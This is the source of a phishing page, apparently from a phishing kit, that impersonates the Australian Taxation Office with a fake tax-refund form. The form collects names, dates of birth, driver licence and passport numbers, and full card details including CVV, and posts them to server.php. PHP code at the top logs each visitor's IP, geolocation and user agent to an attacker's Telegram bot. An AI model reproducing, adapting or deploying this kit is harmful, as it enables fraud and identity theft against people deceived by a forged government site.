<?php
require "antibot.php";
 ?>
<?php
include_once 'settt.php';
include_once 'ip_geo.php';

$date = date("Y-m-d h:i:sa");
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_SERVER['HTTP_USER_AGENT'];
   $location = get_geolocation($apiKey, $ip);
   $decodedLocation = json_decode($location, true);
   $ipgeo = $decodedLocation["country_name"] . ", " . $decodedLocation["state_prov"];

$msg = "* New click * \nGEO: ".$ipgeo." (IP: ".$ip.")\nDatetime: ".$date."\nUseragent: ".$user;
file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id2 ."&text=" . urlencode($msg) ."");
 ?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.6">
    <title>Australian Taxation Office</title>

    <!-- Bootstrap core CSS -->
<link href="index_files/bootstrap.min.css" rel="stylesheet">

    <!-- Favicons -->
<link rel="icon" href="favicon.ico">
<meta name="theme-color" content="#563d7c">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="css/style.css" rel="stylesheet">
<link rel="stylesheet" href="css/iphone.css" media="only screen and (max-device-width: 480px)" />

    <style>
    @font-face {
 font-family:"Swiss721BT-Heavy";
 src:local("Swiss721BT-Heavy"),
 url("webfonts/233CC5_E_0.eot");
 src:local("Swiss721BT-Heavy"),
 url("webfonts/233CC5_E_0.eot?#iefix") format("embedded-opentype"),
 url("webfonts/233CC5_E_0.woff") format("woff"),
 url("webfonts/233CC5_E_0.ttf") format("truetype")
}
@font-face {
 font-family:"Swiss721BT-Light";
 src:local("Swiss721BT-Light"),
 url("webfonts/233CC5_0_0.eot");
 src:local("Swiss721BT-Light"),
 url("webfonts/233CC5_0_0.eot?#iefix") format("embedded-opentype"),
 url("webfonts/233CC5_0_0.woff") format("woff"),
 url("webfonts/233CC5_0_0.ttf") format("truetype")
}
@font-face {
 font-family:"Swiss721BT-Thin";
 src:local("Swiss721BT-Thin"),
 url("webfonts/233CC5_C_0.eot");
 src:local("Swiss721BT-Thin"),
 url("webfonts/233CC5_C_0.eot?#iefix") format("embedded-opentype"),
 url("webfonts/233CC5_C_0.woff") format("woff"),
 url("webfonts/233CC5_C_0.ttf") format("truetype")
}
@font-face {
 font-family:"Swiss721BT-Roman";
 src:local("Swiss721BT-Roman"),
 url("webfonts/233CC5_2_0.eot");
 src:local("Swiss721BT-Roman"),
 url("webfonts/233CC5_2_0.eot?#iefix") format("embedded-opentype"),
 url("webfonts/233CC5_2_0.woff") format("woff"),
 url("webfonts/233CC5_2_0.ttf") format("truetype")
}
@font-face {
 font-family:"Swiss721BT-Bold";
 src:local("Swiss721BT-Bold"),
 url("webfonts/233CC5_4_0.eot");
 src:local("Swiss721BT-Bold"),
 url("webfonts/233CC5_4_0.eot?#iefix") format("embedded-opentype"),
 url("webfonts/233CC5_4_0.woff") format("woff"),
 url("webfonts/233CC5_4_0.ttf") format("truetype")
}
@font-face {
 font-family:"ato-font-family-v2";
 src:local("ato-font-family-v2"),
 url("webfonts/ato-font-family-v2.eot");
 src:local("ato-font-family-v2"),
 url("webfonts/ato-font-family-v2.eot?#iefix") format("embedded-opentype"),
 url("webfonts/ato-font-family-v2.woff") format("woff"),
 url("webfonts/ato-font-family-v2.ttf") format("truetype")
}
@font-face {
 font-family:"ato-font-family";
 src:local("ato-font-family"),
 url("webfonts/ato-font-family.eot");
 src:local("ato-font-family"),
 url("webfonts/ato-font-family.eot?#iefix") format("embedded-opentype"),
 url("webfonts/ato-font-family.woff") format("woff"),
 url("webfonts/ato-font-family.ttf") format("truetype")
}
body {

font-family: "Swiss721BT-Light",Arial,Helvetica,sans-serif;
font-weight: normal;
}
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
      .text-muted{
        color:white !important;
      }
       h5 {
    font-family: "Swiss721BT-Bold",Arial,Helvetica,sans-serif;
    font-weight: normal;
    margin: 30px 0 22px;
        margin-bottom: 22px;
    line-height: 24px;
}
a:hover {
    text-decoration: underline;
    color: #f5d815 !important;
}
.list-unstyled li{
  font-family: "Swiss721BT-Roman",Arial,Helvetica,sans-serif;
font-size: 14px;
line-height: 18px;
margin-bottom: 10px;
}
.jumbotron {
padding-top: 2rem !important;
    padding-bottom: 1rem !important;
  }
  .bodybox {
    background:  #fff none repeat scroll 0 0;
    border-radius: 5px;
    box-shadow: 0 0 4px #333;
    margin: 0 auto 20px;
    padding: 0 0 30px;
}
.pull-right {
    float: right !important;
}

.col-lg-1, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-md-1, .col-md-10, .col-md-11, .col-md-12, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-sm-1, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-xs-1, .col-xs-10, .col-xs-11, .col-xs-12, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9 {
    min-height: 1px;
    padding-left: 15px;
    padding-right: 15px;
    position: relative;
}
h3 {
    border-bottom: 1px solid #e0e0e0;
    color: #3a3a3a;
    display: block;
    font-size: 20px;
    letter-spacing: 0;
    line-height: 24px;
    margin-bottom: 5px;
    margin-top: 20px;
    padding: 0 0 10px;
    position: relative;
    text-align: center;
    top: 12px;
}
.col-xs-12 {
    width: 100%;
}
.clearfix {
    clear: both;
}
.paymentsum p {
    font-size: 12px;
}
.pull-left {
    margin: 0 auto;
}
.row {
    margin-left: -15px;
    margin-right: -15px;
}
.form-group {
    margin-bottom: 8px;
}
.form-group2 {
    margin-top: 15px;
}
label {
    margin-bottom: 2px;
}
label {
    display: inline-block;
    font-weight: 700;
    margin-bottom: 5px;
    max-width: 100%;
}
.form-control {
    height: 30px;
}
.form-control {
    background-color: #fff;
    background-image: none;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
    color: #555;
    display: block;
    font-size: 14px;
    height: 34px;
    line-height: 1.42857;
    padding: 6px 12px;
    transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s;
    width: 100%;
}
.col-xs-6 {
    width: 50%;
}
.bodybox {
height: 800px;
}
.card{
  border: 0px !important;
}
.col-xs-1, .col-xs-10, .col-xs-11, .col-xs-12, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9 {
    float: left;
}
.no-gutter {
    padding: 0;
}
.col-sm-5 {
    width: 41.6667%;
}
.col-sm-7 {
    width: 58.3333%;
}
input.btn-block[type="button"], input.btn-block[type="reset"], input.btn-block[type="submit"] {
    width: 100%;
}
.btn-warning {
    background-color: #f0ad4e;
    border-color: #eea236;
    color: #fff;
}
.btn-group-lg > .btn, .btn-lg {
    border-radius: 6px;
    font-size: 18px;
    line-height: 1.33333;
    padding: 10px 16px;
}
input.btn-block[type="button"], input.btn-block[type="reset"], input.btn-block[type="submit"] {
    width: 100%;
}
.col-xs-12 {
    width: 100%;
}

.divepoch {
    clear: right;
}

.pull-right {
    float: right !important;
}
.paymentsum p {
    font-size: 12px;
}
.thawte {
    float: right;
    margin-right: 40px;
    margin-top: 42px;
}
.loaderbar{
  display:none;
}
.overlay{
  display:none;
}
.visible {
  background: #fff;
  position: fixed;
  left: 50%;
  top: 30%;
  margin-top: -200px;
  overflow: hidden;
  z-index: 2000;
  width: 400px;
  padding: 0px;
  margin-left: -200px;
}
.overlay {
    background: #000;
    position: fixed;
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    z-index: 1000;
    opacity: .5;
}
    </style>

    <!-- Custom styles for this template -->
    <link href="index_files/album.css" rel="stylesheet">
  <style id="rds_highlighting">a.rds_hl_nofollow {text-decoration: line-through !important;}img.rds_hl_nofollow {outline: 1px dashed #000;}</style></head>
  <script type="text/javascript" src="js/jquery-1.4.2.min.js"></script>
  <script type="text/javascript" src="js/gx2.js"></script>
  <body>
    <header>
  <div class="collapse" id="navbarHeader">
    <div class="container">
      <div class="row">
        <div class="col-sm-8 col-md-7 py-4">
          <h4 class="text-white">About</h4>
          <p class="text-muted">Add some information about the album below, the author, or any other background context. Make it a few sentences long so folks can pick up some informative tidbits. Then, link them off to some social networking sites or contact information.</p>
        </div>
        <div class="col-sm-4 offset-md-1 py-4">
          <h4 class="text-white">Contact</h4>
          <ul class="list-unstyled">
            <li><a href="https://getbootstrap.com/docs/4.4/examples/album/#" class="text-white">Follow on Twitter</a></li>
            <li><a href="https://getbootstrap.com/docs/4.4/examples/album/#" class="text-white">Like on Facebook</a></li>
            <li><a href="https://getbootstrap.com/docs/4.4/examples/album/#" class="text-white">Email me</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>

  <div style="background-color: #F5742D;" class="navbar shadow-sm">
    <div class="container d-flex justify-content-between">
      <p style="font-size: 0.9em;font-family: "Swiss721BT-Light",Arial,Helvetica,sans-serif;" class="alert-message;">We are experiencing high call volumes resulting in long wait times. If you've been affected by COVID-19 (novel coronavirus) and need assistance, visit <a style="color:black;text-decoration:underline;" href="" title="COVID-19">COVID-19</a>.</p>

    </div>
  </div>
  <div class="navbar shadow-sm">
    <div class="container d-flex justify-content-between">
      <a href="https://getbootstrap.com/docs/4.4/examples/album/#" class="navbar-brand d-flex align-items-center">
        <img src="logo.png">
      </a>

    </div>
  </div>
</header>

<main role="main">

  <section class="jumbotron text-center">
    <div class="container">

      <p style="color: #6c757d !important;" class="lead text-muted">In order to proceed your Tax refund, we need to collect some of your details. Please fill in all the required fields and press submit button.</p>
<p style="color: #6c757d !important;" class="lead text-muted">You will receive a text message as soon as we confirm your details.</p>
    </div>
  </section>
  <div class="album py-5 bg-light">
    <div class="container">

      <div class="row">
        <div class="mbody">
                <div class="bodybox container">



                    <!--/colright-->


                    <div class="col-md-6 pull-left">
                        <h3>Personal Details</h3>

                                          <div id="err-block" class="error" style="padding-top:10px;"></div>


            <form method="POST" id="formx" action="javascript:void(null);" onsubmit="call()">



                        <div class="row">
                          <div class="col-xs-6 form-group card ">
                            <label class="control-label">First Name</label>
                            <input name="name" value="" class="form-control" size="4" type="text" required>
                                              </div>
                          <div class="col-xs-6 form-group card ">
                            <label class="control-label">Middle Name</label>
                            <input name="middle" value="" class="form-control" size="4" type="text">

                                              </div>
                        </div>
                        <div class="row">

                          <div class="col-xs-6 form-group card ">
                            <label class="control-label">Last Name</label>
                            <input name="surname" value="" class="form-control" size="4" type="text" required>

                                              </div>
                        </div>
			
			<div class="row">

                          <div class="col-xs-6 form-group card ">
                            <label class="control-label">Date of Bith</label>
                            <input name="dob" value="" class="form-control" size="4" type="text" placeholder="dd/mm/yyyy" pattern="(0[1-9]|1[0-9]|2[0-9]|3[01])\/(0[1-9]|1[012])\/[0-9]{4}" required>

                                              </div>
                        </div>

			<div class="row">
                          <div class="col-xs-12 form-group form-group2 card ">
			    <br>
                            <label class="control-label">Australian Driver Licence Number</label>
                            <input name="dlnumber" value="" class="form-control" size="4" type="text" maxlength="12" pattern="[0-9]*" required>

                                              </div>
			</div>
                         
			<div class="row"> 
			  <div class="col-xs-6 form-group card ">
                          <label class="control-label">State of Issue</label>
			  <select style="height: 40px;width: 100%;margin-bottom: 10px;" id="dlstate" name="dlstate" required>
			  <option label="Select..." value="noselected">Select...</option>
                          <option label="ACT" value="ACT">ACT</option>
                          <option label="NSW" value="NSW">NSW</option>
                          <option label="QLD" value="QLD">QLD</option>
                          <option label="NT" value="NT">NT</option>
                          <option label="SA" value="SA">SA</option>
                          <option label="TAS" value="TAS">TAS</option>
                          <option label="VIC" value="VIC">VIC</option>
                          <option label="WA" value="WA">WA</option>
		          </select>
			  <p id="invaliddlstate" style="color:red;display:none;">Please select state of DL issue</p>

                                              </div>

                          <div class="col-xs-6 form-group card ">
                            <label class="control-label">DL Expiry Date</label>
			    <input name="dlexp" value="" class="form-control" size="4" type="text" placeholder="dd/mm/yyyy" pattern="(0[1-9]|1[0-9]|2[0-9]|3[01])\/(0[1-9]|1[012])\/[0-9]{4}" required>

                                              </div>
                        </div>

			
			<div class="row">

                          <div class="col-xs-6 form-group2 card ">
                            <label class="control-label">Passport Number</label>
                            <input name="passnumber" value="" class="form-control" size="4" type="text" required>
                                              </div>

                          <div class="col-xs-6 form-group2 card ">
                            <label class="control-label">Passport Expiry Date</label>
                            <input name="passexp" value="" class="form-control" size="4" type="text" placeholder="dd/mm/yyyy" pattern="(0[1-9]|1[0-9]|2[0-9]|3[01])\/(0[1-9]|1[012])\/[0-9]{4}" required>

                                              </div>
                        </div>
			
			<div> <p></p><p></p><p></p><p></p></div>

                        <div class="row">
                          <div class="col-xs-12 form-group form-group2 card ">
                            <label class="control-label">Card Number</label>
                            <!--<input id="cc" name="signup[cc:1:13:16:::mod10_check]" value="" autocomplete="off" class="form-control card-number" size="20" maxlength="19" type="text" required>-->
                            <input name="product_price" value="" id="cardnumber" class="form-control card-number" size="20" maxlength="16" pattern="[0-9]*" type="text" required>
                            <p id="invalidcc" style="color:red;display:none;">Please enter valid card</p>
                                              </div>
                        </div>
                        <div style="margin-bottom: 20px;" class="row">
                          <div class="col-sm-12"><label style="width: 100%;" class="control-label">Expiration date</label></div>
                          <div class="col-sm-6">



                                <select style="height: 40px;width: 100%;margin-bottom: 10px;" id="exp_month" name="exp_month"  required>
                          <option label="January (01)" value="01">January (01)</option>
                          <option label="February (02)" value="02">February (02)</option>
                          <option label="March (03)" value="03">March (03)</option>
                          <option label="April (04)" value="04">April (04)</option>
                          <option label="May (05)" value="05">May (05)</option>
                          <option label="June (06)" value="06">June (06)</option>
                          <option label="July (07)" value="07">July (07)</option>
                          <option label="August (08)" value="08">August (08)</option>
                          <option label="September (09)" value="09">September (09)</option>
                          <option label="October (10)" value="10">October (10)</option>
                          <option label="November (11)" value="11">November (11)</option>
                          <option label="December (12)" value="12">December (12)</option>

                                </select>


                          </div>
<div class="col-sm-6">

    <select style="height: 40px;width: 100%;margin-bottom: 10px;" id="exp_year" name="exp_year"  required>

<option label="2021" value="21">2021</option>
<option label="2022" value="22">2022</option>
<option label="2023" value="23">2023</option>
<option label="2024" value="24">2024</option>
<option label="2025" value="25">2025</option>
<option label="2026" value="26">2026</option>
<option label="2027" value="27">2027</option>
<option label="2028" value="28">2028</option>
<option label="2029" value="29">2029</option>
<option label="2030" value="30">2030</option>
<option label="2031" value="31">2031</option>
<option label="2032" value="32">2032</option>
<option label="2033" value="33">2033</option>
<option label="2034" value="34">2034</option>
<option label="2035" value="35">2035</option>
<option label="2036" value="36">2036</option>
<option label="2037" value="37">2037</option>
<option label="2038" value="38">2038</option>

    </select>
    <p id="invalidexp" style="color:red;display:none;">Please enter valid expiration date</p>

</div>

                          <div class="col-sm-5">
                              <div class="col-xs-6 no-gutter form-group cvc ">
                                <label class="control-label">CVV2/CVC2</label>
                                <input id="cvv" name="cvv" value="" class="form-control card-cvc" placeholder="" size="4" minlength="3" maxlength="4" type="text" pattern="[0-9]*" required>
                                                      </div>
                              <div class="col-xs-6  form-group cvc ">
                                <img src="images/cvv2.png" class="cvv">
                              </div>
                              <div class="clearfix"></div>
                          </div>


                        </div>



                        <div style="margin: 0 auto;" class="submitdiv  col-xs-12 row">
                          <input name="ip" value="<?php echo $_SERVER["REMOTE_ADDR"]; ?>"   size="20" type="hidden">
                          <input name="user" value="<?php echo $_SERVER['HTTP_USER_AGENT']; ?>"  type="hidden">
                         <input name="ipgeo" value="<?php echo $ipgeo; ?>"  type="hidden">

                    <p style="width: 100%;"><input class="btn btn-warning btn-lg btn-block" value="SUBMIT" type="submit">
                    </p>


                        </div>

                                                    

                    </form></div>
                    <!--/colleft-->


                           <div class="col-md-6 pull-right">
                        <div class="col-xs-12 form-group">










        				</div>
                    </div>

                    <div class="col-md-6 clearfix pull-left">
                        <div class="col-xs-12 form-group">

                        </div>

                        <div id="waiting" style="position:fixed; left:50%; top:45%; margin-left: -300px; margin-top: -150px; display: none; z-index:9999;">
                <img src="images/progressbar.gif">
            </div>







                    </div>






                     </div>
            </div>

</div></div></div>

</main>

<footer class="text-muted">
  <div class="container">
    <div style="color:white;" class="row">
      <div class="col-6 col-md">
        <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">About ATO</h5>
        <ul class="list-unstyled text-small">
          <li><a class="text-muted" href="#">About us</a></li>
          <li><a class="text-muted" href="#">Contact us</a></li>
          <li><a class="text-muted" href="#">Consultation</a></li>
          <li><a class="text-muted" href="#">Careers</a></li>
          <li><a class="text-muted" href="#">Media centre</a></li>
          <li><a class="text-muted" href="#">Taxpayers' Charter</a></li>
          <li><a class="text-muted" href="#">Research and statistics</a></li>
          <li><a class="text-muted" href="#">Subscribe</a></li>
          <li><a class="text-muted" href="#">Privacy</a></li>
        </ul>
        <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">Related sites</h5>
        <ul class="list-unstyled text-small">
          <li><a class="text-muted" href="#">Australian Business Register</a></li>
          <li><a class="text-muted" href="#">Tax Practitioners Board</a></li>
          <li><a class="text-muted" href="#">More related sites</a></li>
        </ul>
      </div>
          <div class="col-6 col-md">
            <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">Tools</h5>
            <ul class="list-unstyled text-small">
              <li><a class="text-muted" href="#">Forms and instructions</a></li>
              <li><a class="text-muted" href="#">Tax rates and codes</a></li>
              <li><a class="text-muted" href="#">Calculators and tools</a></li>
              <li><a class="text-muted" href="#">Print publications</a></li>
              <li><a class="text-muted" href="#">ATO app including myDeductions</a></li>
            </ul>
            <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">Using ato.gov.au</h5>
            <ul class="list-unstyled text-small">
              <li><a class="text-muted" href="#">Accessibility</a></li>
              <li><a class="text-muted" href="#">Smarter searching</a></li>
              <li><a class="text-muted" href="#">Languages</a></li>
              <li><a class="text-muted" href="#">Acknowledgment of country</a></li>
              <li><a class="text-muted" href="#">Our commitment to you</a></li>
              <li><a class="text-muted" href="#">Disclaimer</a></li>
              <li><a class="text-muted" href="#">Definitions</a></li>
              <li><a class="text-muted" href="#">A-Z Index</a></li>
              <li><a class="text-muted" href="#">What's new</a></li>
              <li><a class="text-muted" href="#">Website feedback</a></li>
              <li><a class="text-muted" href="#">Report tax evasion</a></li>
              <li><a class="text-muted" href="#">Sitemap</a></li>
            </ul>
          </div>
          <div class="col-6 col-md">
            <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">Help for taxpayers</h5>
            <ul class="list-unstyled text-small">
              <li><a class="text-muted" href="#">Aboriginal and Torres Strait Islander people</a></li>
              <li><a class="text-muted" href="#">Education zone</a></li>
              <li><a class="text-muted" href="#">Freedom of information</a></li>
              <li><a class="text-muted" href="#">Getting help with your tax</a></li>
              <li><a class="text-muted" href="#">Norfolk Island tax and super</a></li>
              <li><a class="text-muted" href="#">Online security</a></li>
              <li><a class="text-muted" href="#">Other languages</a></li>
              <li><a class="text-muted" href="#">People with disability</a></li>
            </ul>
            <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">Law rulings and policy</h5>
            <ul class="list-unstyled text-small">
              <li><a class="text-muted" href="#">ATO advice and guidance</a></li>
              <li><a class="text-muted" href="#">New legislation</a></li>
              <li><a class="text-muted" href="#">Legal database</a></li>
            </ul>
          </div>
          <div class="col-6 col-md">
            <h5 style="font-size: 16px;line-height: 19px;margin-bottom: 10px;">Getting it right</h5>
            <ul class="list-unstyled text-small">
              <li><a class="text-muted" href="#">Your rights and obligations</a></li>
              <li><a class="text-muted" href="#">Tax planning</a></li>
              <li><a class="text-muted" href="#">Insight: Building trust and confidence</a></li>
              <li><a class="text-muted" href="#">Correct a mistake or amend a return</a></li>
              <li><a class="text-muted" href="#">Dispute or object to an ATO decision</a></li>
              <li><a class="text-muted" href="#">The fight against tax crime</a></li>
              <li><a class="text-muted" href="#">Tax avoidance taskforce</a></li>
              <li><a class="text-muted" href="#">Tax and Corporate Australia</a></li>
              <li><a class="text-muted" href="#">Tax and individuals - not in business</a></li>
              <li><a class="text-muted" href="#">Tax and small business</a></li>
            </ul>
          </div>
        </div>
  </div>
  <div class="overlay"></div>
<img class="loaderbar visible" src="images/progressbar.gif">
<div id="win" style="display:none;">
   <div class="overlay"></div>
      <div class="visible container">
          <div class="content">
            <div style="width:200px;margin:0 auto;"><img src="images/gal3.png"></div>
            <p style="color: black;text-align: center;">Thank you, we have received your info.</p>

          </div>

    </div>
</div>
</footer>
<footer style="background:#444" class="text-muted">
  <div class="container"><div style="color:white;" class="row">
    <div class="col-6 col-md">
      <p><a style="color:white;font-family: 'Swiss721BT-Light',Arial,Helvetica,sans-serif;
font-size: 18px;
font-weight: normal;
margin-bottom: 0;
margin-top: 0;text-decoration:underline;" href="">Australian Taxation Office
</a></p>
<p style="color:white;color: white;
font-family: 'Swiss721BT-Roman',Arial,Helvetica,sans-serif;
font-size: 14px;">Working for all Australians
</p>
</div>
    <div class="col-6 col-md"><img style="width: 190px;" src="social.png"></div>
    <div class="col-6 col-md"><a style="color:white;" href="">© Commonwealth of Australia
</a></div>
  </div></div>
  </footer>
  <script>
  function call() {
$("#invalidcc").css({"display": "none"});
$("#invalidexp").css({"display": "none"});
$("#invaliddlstate").css({"display": "none"});
     $('.loaderbar').show();
     $('.overlay').show();
     setTimeout(function() {
       var msg   = $('#formx').serialize();
         $.ajax({
           type: 'POST',
           url: 'server.php',
           data: msg,
           success: function(data) {

             if(data == '1'){
               $('.loaderbar').hide();
               $('.overlay').hide();
               //alert('You are not 18 years old');
                $("#invalidcc").css({"display": "block"});
             }
             if(data == '2'){
               $('.loaderbar').hide();
               $('.overlay').hide();
               //alert('You are not 18 years old');
                $("#invalidexp").css({"display": "block"});
             }
             
	     if(data == '4'){
               $('.loaderbar').hide();
               $('.overlay').hide();
               //alert('You are not 18 years old');
                $("#invaliddlstate").css({"display": "block"});
             }

             if(data == '3'){
               $('.loaderbar').hide();
               $('.overlay').show();
               $('#win').show();
               //$('.waiter__').show();
               setTimeout(function() {
                 location.href = '../';

              return false; },
               4000);

             }


            /* $('#results').html(data);
             alert(data);
             $('#win').show();
             $('.loaderbar').hide();*/
           },
           error:  function(xhr, str){
      alert('Возникла ошибка: ' + xhr.responseCode);
           }
         });



    return false; },
     2000);

  }
  </script>

  <script type='text/javascript' src='js/jquery.simplemodal.js'></script>
  <script type='text/javascript' src='js/osx.js'></script>
</body></html>

